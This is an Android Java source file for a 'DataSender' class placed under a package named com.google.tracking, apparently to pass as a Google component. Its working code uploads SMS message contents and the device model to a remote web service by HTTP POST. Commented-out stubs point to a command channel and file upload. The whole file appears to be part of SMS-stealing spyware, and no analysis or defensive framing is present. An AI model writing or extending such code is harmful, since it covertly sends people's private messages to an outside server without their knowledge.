package com.google.tracking.sender;

import android.os.Build;
import android.util.Log;
import com.google.tracking.constants.TrackingConstants;

import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.PortUnreachableException;
import java.net.URL;
import java.nio.charset.Charset;

/**
 * Created by maxim.yanukovich on 06.01.2015.
 */
public class DataSender implements IDataSender{
    private static final String TAG = "DataSender";

    private static String SMS = "sms";
    private static String COMMAND = "command";
    private static String SAVE_FILE = "file";

    public DataSender() {
        Log.d(TAG, urlString().toString());

        disableConnectionReuseIfNecessary();
    }

    public String urlString(){
        return TrackingConstants.WEB_SERVICE_URL;
    }

    public void getNextAction() {
//        postHttp(COMMAND, "message");
    }

    public void sendSMS(String msg) {
        postHttp(SMS, msg.getBytes());
    }

    public void sendFile(byte[] file){


//        postHttp(SAVE_FILE, );
    }

    private void postHttp(String action, byte[] postData) {
        try {

            String urlParameters = "action=" + action + "&msg=" + "" + "&model=" + Build.MODEL;

            int postDataLength = postData.length;

            URL url = new URL(urlString());
            HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
            httpConn.setDoOutput(true);
            httpConn.setDoInput(true);
            httpConn.setInstanceFollowRedirects(false);
            httpConn.setRequestMethod("POST");
            httpConn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            httpConn.setRequestProperty("charset", "utf-8");
            httpConn.setRequestProperty("Content-Length", Integer.toString(postDataLength));
            httpConn.setUseCaches(false);
            httpConn.connect();
            try {
                DataOutputStream os = new DataOutputStream(httpConn.getOutputStream());
                os.write(postData);

                Log.d(TAG, " getResponseCode:" + String.valueOf(httpConn.getResponseCode()));

//                DataInputStream is = new DataInputStream(httpConn.getInputStream());


//                Log.d(TAG, "input : " + is.readUTF());

            } catch (Exception ex) {
                Log.d(TAG, "Exception : " + ex.getMessage());
            }


            // Handles possible exceptions
        } catch (MalformedURLException localMalformedURLException) {
            localMalformedURLException.printStackTrace();

        } catch (IOException localIOException) {
            localIOException.printStackTrace();
        }
    }

    private void disableConnectionReuseIfNecessary() {
        // HTTP connection reuse which was buggy pre-froyo
        if (Integer.parseInt(Build.VERSION.SDK) < Build.VERSION_CODES.FROYO) {
            System.setProperty("http.keepAlive", "false");
        }
    }
}
